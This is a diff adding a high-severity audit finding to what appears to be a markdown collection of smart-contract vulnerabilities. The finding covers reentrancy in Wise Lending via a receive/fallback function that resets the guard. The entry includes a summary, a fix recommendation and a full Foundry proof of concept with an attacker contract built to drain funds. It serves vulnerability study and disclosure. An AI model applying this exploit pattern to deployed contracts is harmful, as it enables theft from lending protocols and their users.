@@ -253,3 +253,105 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 4. [High] Exploitation of the receive Function to Steal Funds
+
+### Reentrancy by receive function
+
+- Summary: The contract has a reentrancy vulnerability due to a flaw in its guard mechanism. Attackers can reset the guard using a receive function, allowing them to execute unauthorized withdrawals. They can deposit ETH, borrows some, then initiates a withdrawal, resetting the guard to pay off their own loan and withdraw additional funds.
+
+- Impact & Recommendation: The vulnerability enables unauthorized fund withdrawals from the contract. The recommendation is to add a reentrancy check to the \_sendValue function to prevent exploitation, without disrupting transfers from the WETH address.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-wise-lending#h-01-exploitation-of-the-receive-function-to-steal-funds) & [Report](https://code4rena.com/reports/2024-02-wise-lending)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    // import ContractA
+    import "./ContractA.sol";
+    // import MockErc20
+    import "./MockContracts/MockErc20.sol";
+    contract WiseLendingShutdownTest is Test {
+        ...
+        ContractA public contractA;
+        function _deployNewWiseLending(bool _mainnetFork) internal {
+            ...
+            contractA = new ContractA(address(FEE_MANAGER_INSTANCE), payable(address(LENDING_INSTANCE)));
+            ...
+        }
+        function testExploitReentrancy() public {
+            uint256 depositValue = 10 ether;
+            uint256 borrowAmount = 2 ether;
+            vm.deal(address(contractA), 2 ether);
+            ORACLE_HUB_INSTANCE.setHeartBeat(WETH_ADDRESS, 100 days);
+            POSITION_NFTS_INSTANCE.mintPosition();
+            uint256 nftId = POSITION_NFTS_INSTANCE.tokenOfOwnerByIndex(address(this), 0);
+            LENDING_INSTANCE.depositExactAmountETH{value: depositValue}(nftId);
+            LENDING_INSTANCE.borrowExactAmountETH(nftId, borrowAmount);
+            vm.prank(address(LENDING_INSTANCE));
+            MockErc20(WETH_ADDRESS).transfer(address(FEE_MANAGER_INSTANCE), 1 ether);
+            // check contractA balance
+            uint ethBalanceStart = address(contractA).balance;
+            uint wethBalanceStart = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));
+            //total
+            uint totalBalanceStart = ethBalanceStart + wethBalanceStart;
+            console.log("totalBalanceStart", totalBalanceStart);
+            // deposit using contractA
+            vm.startPrank(address(contractA));
+            LENDING_INSTANCE.depositExactAmountETHMint{value: 2 ether}();
+            vm.stopPrank();
+        FEE_MANAGER_INSTANCE._increaseFeeTokens(WETH_ADDRESS, 1 ether);
+
+            // withdraw weth using contractA
+            vm.startPrank(address(contractA));
+            LENDING_INSTANCE.withdrawExactAmount(2, WETH_ADDRESS, 1 ether);
+            vm.stopPrank();
+            // approve feemanager for 1 weth from contractA
+            vm.startPrank(address(contractA));
+            MockErc20(WETH_ADDRESS).approve(address(FEE_MANAGER_INSTANCE), 1 ether);
+            vm.stopPrank();
+            // borrow using contractA
+            vm.startPrank(address(contractA));
+            LENDING_INSTANCE.borrowExactAmount(2,  WETH_ADDRESS, 0.5 ether);
+            vm.stopPrank();
+            // Payback amount
+            //499537556593483218
+            // withdraw using contractA
+            vm.startPrank(address(contractA));
+            LENDING_INSTANCE.withdrawExactAmountETH(2, 0.99 ether);
+            vm.stopPrank();
+            // check contractA balance
+            uint ethBalanceAfter = address(contractA).balance;
+            uint wethBalanceAfter = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));
+            //total
+            uint totalBalanceAfter = ethBalanceAfter + wethBalanceAfter;
+            console.log("totalBalanceAfter", totalBalanceAfter);
+            uint diff = totalBalanceAfter - totalBalanceStart;
+            assertEq(diff > 5e17, true, "ContractA profit greater than 0.5 eth");
+        }
+    // SPDX-License-Identifier: -- WISE --
+    pragma solidity =0.8.24;
+    // import lending and fees contracts
+    import "./WiseLending.sol";
+    import "./FeeManager/FeeManager.sol";
+    contract ContractA {
+        address public feesContract;
+        address payable public lendingContract;
+        address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+        constructor(address _feesContract, address payable _lendingContract) payable {
+            feesContract = _feesContract;
+            lendingContract = _lendingContract;
+        }
+        fallback() external payable {
+            if (msg.sender == lendingContract) {
+                // send lending contract 0.01 eth to reset reentrancy flag
+                (bool sent, bytes memory data) = lendingContract.call{value: 0.01 ether}("");
+                //paybackBadDebtForToken
+                FeeManager(feesContract).paybackBadDebtForToken(2, WETH_ADDRESS, WETH_ADDRESS, 499537556593483218);
+            }
+        }
+    }
+
+
+  ```
+
+  </details>
